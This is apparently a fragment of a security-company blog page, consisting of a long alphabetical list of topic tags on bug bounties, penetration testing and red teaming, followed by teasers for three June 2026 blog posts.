bypass MGM breach MGM cyberattack Microsoft misconfigurations Misuse Act mitigating AI bias mobile Monash CISO Monash University moneytree moneytree bug bounty moneytree pentest Movember movies multi-factor authentication MVP MVP Program mythos mythos bug hunting mythos vulnerabilities n8n nancy mace nation state attacks National football league neighborhood watch Netflix netflix zero day netflix zero day accuracy netflix zero day attack netflix zero day realistic netskope network pen test network penetration testing new hire newsletter next gen pen test next-gen pen tests NFL NFL CISO NGPT Nick McKenzie CISO Nicole Anderson-Au NIS 2 directive NIS2 NIS2 control NIS2 date NIS2 directive NIS2 fines NIS2 timing NIST Secure Software Development Framework NIST SP 800-53 notifications nuclei nuclei templates offensive cybersecurity offensive security offensive security financial services offensive security frameworks offensive security testing offensive security testing fedramp offensive security testing government offensive security tools Okta online shopping security online streaming open source orchestration outage outdated software outhackthemall OWASP OWASP AI OWASP LLM OWASP top 10 OWASP top 10 AI P1 P1 submissions P1 Warriors P1 Warrriors palo alto vulnerability pandemic partnership passwords payment trends payments payouts PCI compliance PCI-DSS pen pen test pen test as a service pen test best practices pen test infographic pen test rotation pen test singapore pen test vendor rotation pen test vendor switching pen tester pen testers pen testing pen testing as a service pen testing best practices pen testing compliance pen testing requirements pen testing services pen testing singapore pen testing tips pen testing types pen testing vs bug bounty penetration test services penetration tester penetration testing penetration testing as a service penetration testing risk-based security penetration testing vs bug bounty penetration tests Pentest pentester PentesterLab pentesting phishing phishing attacks phone based attacks phone breach physical attack surface pi partner planning platform platform integrations platform updates PLD podcast point in time penetration testing policy portfolio accounts pplications predictions preemptive security pricing Pride Pride Month printnightmare priority one priority percentiles privacy Private Invites private program proactive security proactive security testing Product liability directive product update program program brief Program Challenge program invites program launch program management program rewards program scope program setup program spotlight program updates programs project strange prompt injection prompt injection hacking prompt injection security protect against device code phishing PSTI act PTaaS PTaaS black hat PTAAS singapore ptaas vs bug bounty public bug bounty program public program public sector public sector bug bounty public sector cybersecurity public sector security public sector VDP public security security q4 QR code security QR phishing QR phishing attacks QueerCon quishing quishing attacks rachel tobac ransom ransomware ransomware attacks ransomware casino rapyd React React vulnerability React2shell react2shell vulnerability reactive security Recon Village reconnaissance red team red team as a service red team assessments red team benefits red team bugcrowd red team certification red team challenges red team CISO red team cost red team frameworks red team insurance red team outcomes red team process red team pros and cons red team qualifications red team report red team results red team steps red team strategy red team testing red team validation red teamers red teaming red teaming finance red teaming healthcare red teaming industrial red teaming insurance red teaming manufacturing red teaming tools red teaming use cases red teaming vs pen testing red teams red teams finance red teams healthcare red teams manufacturing red teams pharmaceuticals Redox reduce attack surface REGEX remediation remote work report Report Improvements reporting research researcher researcher availability researcher awards researcher collaboration researcher commuity researcher community Researcher Event researcher marketing researcher rewards researcher spotlight Researcher Success researchers responsible disclosure responsible disclosure policy retail retail cybersecurity retail security REvil reward ranges rewards rey bango risk risk committees risk management risk management 2024 risks of AI security testing ROI attack surface management ROI Bugcrowd ROI crowdsourced security ROI security role of red teaming RSA RSA 2024 RSA 2026 RSA agenda RSA AI RSA conference RSA Conference 2020 RSA Conference 2023 RSA parties RSA presentations RSA Security RSA2020 RTaaS SaaS bugcrowd SaaS crowdsourced security SaaS offensive security SaaS security SaaS security challenges SaaS security talent gap SaaS security testing safe harbor salt typhoon savant savant AI SBD SBD pledge scanner schibsted schibsted bug bounty schibsted security scope scoping SDLC SEC cyber governance SEC cybersecurity SEC cybersecurity final rule SEC final rule SEC incident disclosure secure by default secure by design security security advice security AI security AI capabilities security analytics security assessments security attack surface Security automation security best practices security best practices for companies security brand security breach security budget security career advice security checklist security chief product officer security compliance security data security data AI security flash security infographic security innovation security innovation lab security jobs security knowledge graph security KPIs security leaders security leadership security maturity security maturity journey security mistakes security myths security news security operations security platform security posture security predictions security professionals security regulation europe security regulation UK security reporting security reputation security research security research team security researcher security researcher set up security researchers security resilience security ROI security scorecard security set up security skills gap security statistics security stats security strategy security talent security teams security testing security testing automation security trends security trends report security trust security vendor consolidation security vulnerabilities security zero trust self-serve self-service Sendbird sendbird bug bounty Sendbird security ServiceNow setting up a VDP SF AIDS Foundation shadow IT SHE shipping cybersecurity shipping security shodan shodan benefits shodan risks shodan search engine shontel brown signal hijacking signal-to-noise ratio silicon valley bank skills match skills shortage slack integration sloptimism SMB crowdsourced security SMB security SOC2 social engineering software PLD software vulnerabilities software vulnerability Sophos SoundCloud spotlight SQL injections SQLi Star Level 1 start up pen testing start up security testing startup offensive testing startup pen testing startup security steps vulnerability management lifecycle stunt hacking subdomain takeovers Submission Editing submission trends submissions supply chain backdoors supply chain security survey SVB swag Swiss T-Mobile T-Mobile award T-Mobile Bug Bounty T-Mobile security taking stock tango task list team team hacking Team Hunt tech start up security technology trends telco breach third-party breaches Thought leadership threat detection threat intelligence threat response threat simulation Tip Jar tips and tricks Tomas Maldonado tools top researchers top security vulnerabilities traditional penetration testing Trey Ford triage trinity chavez bugcrowd trust types of offensive security types of pen testing UK CMA act UK cybersecurity regulation UK hacker laws UK hackers Ultimate Guide Ultimate Guide to XSS Umesh Shankar unicode university cybersecurity university hacking unsecured wifi unsolved cyber mysteries unsolved mysteries US Air Force US cybersecurity US infrastructure security usa VDP Valentine's Day VDP VDP benefits VDP best practices VDP compliance VDP local government vdp meaning VDP requirements vdp reviews VDP state government VDPs VDPs government vendor security evaluation verizon data breach investigations report verizon DBIR verizon security report vibe coding Virtual Virtual Conference virtual enviornments voting machine hacking VPN VRT vulnerabilities vulnerability vulnerability disclosure vulnerability disclosure example vulnerability disclosure policy vulnerability disclosure program vulnerability disclosure programs vulnerability management vulnerability management lifecycle vulnerability mitigation vulnerability prioritization vulnerability rating taxonomy vulnerability remediation vulnerability report vulnerability scanner vulnerability scanners vulnerability scanning vulnerability scoring vulnerability trends waitlisted wank worm wank worm hack web application penetration testing web3 website penetration testing what is a bug bounty program what is a vdp what is AI bias what is attack surface management what is bug bounty what is pen testing what is penetration testing what is penetration testing as a service What is PTaaS? what is vdp white hat hackers whitehat whitehat hackers why pen test winners women hackers women in cybersecurity women in security women in tech working with hackers worm attacks XBOW XSS XZ compression library xz/liblzma ZAP zero day zero day attack zero trust zero trust privacy zero-day attacks zero-day vulnerabilities zilliqa zodiac signs

### More from the blog

![Experience vs methodology: How hackers make decisions](https://www.bugcrowd.com/wp-content/uploads/2026/06/Blog-Headline_06-11-26-2.png)

[ Thought Leadership ](https://www.bugcrowd.com/blog/?t__category=20)

#### Experience vs methodology: How hackers make decisions

By Andrew Wilson | Offensive AI VP, Jun 22, 2026 

[ Read More ](https://www.bugcrowd.com/blog/experience-vs-methodology-how-hackers-make-decisions/)

![Community spotlight: Just Eat Takeaway.com](https://www.bugcrowd.com/wp-content/uploads/2026/02/Blog-Community-Spotlight-Just-Eat_2026-01-19.png)

[ Community Spotlight ](https://www.bugcrowd.com/blog/?t__category=10)

#### Community spotlight: Just Eat Takeaway.com

By Erica Azad, Jun 18, 2026 

[ Read More ](https://www.bugcrowd.com/blog/community-spotlight-just-eat-takeaway-com/)

![Bugcrowd and Pi: Combining vulnerability discovery and engineering execution](https://www.bugcrowd.com/wp-content/uploads/2026/06/Blog_Bugcrowd-and-Pi_2026-06-12.png)

[ Bugcrowd News ](https://www.bugcrowd.com/blog/?t__category=26)

#### Bugcrowd and Pi: Combining vulnerability discovery and engineering execution

By Jacques Lopez | VP, Channel Sales and Strategic Alliances, Jun 24, 2026 

[ Read More ](https://www.bugcrowd.com/blog/bugcrowd-and-pi-combining-vulnerability-discovery-and-engineering-execution/)

##  Subscribe for updates
